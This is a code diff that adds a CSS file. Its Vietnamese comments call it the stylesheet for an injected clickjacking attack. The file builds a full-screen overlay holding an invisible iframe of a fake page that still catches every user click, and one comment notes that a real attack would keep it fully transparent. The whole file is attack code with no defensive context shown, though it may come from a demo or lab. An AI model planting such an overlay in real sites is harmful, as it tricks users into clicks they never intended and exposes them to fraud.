@@ -1,0 +1,27 @@
+/* CSS cho mã độc Clickjacking đã bị inject */
+
+#malicious-clickjack-overlay {
+  /* Overlay này sẽ che phủ toàn bộ trang */
+  position: fixed !important;
+  top: 0 !important;
+  left: 0 !important;
+  width: 100vw !important;
+  height: 100vh !important;
+  z-index: 999999 !important;
+  pointer-events: none !important;
+}
+
+#malicious-clickjack-overlay iframe {
+  /* Iframe chứa trang giả mạo */
+  width: 100% !important;
+  height: 100% !important;
+  border: none !important;
+  opacity: 0 !important; /* Ẩn hoàn toàn - người dùng không thấy */
+  pointer-events: all !important; /* Nhưng vẫn bắt được click */
+}
+
+/* Animation để test - trong thực tế sẽ để opacity: 0 */
+@keyframes revealAttack {
+  0% { opacity: 0; }
+  100% { opacity: 0.5; }
+}
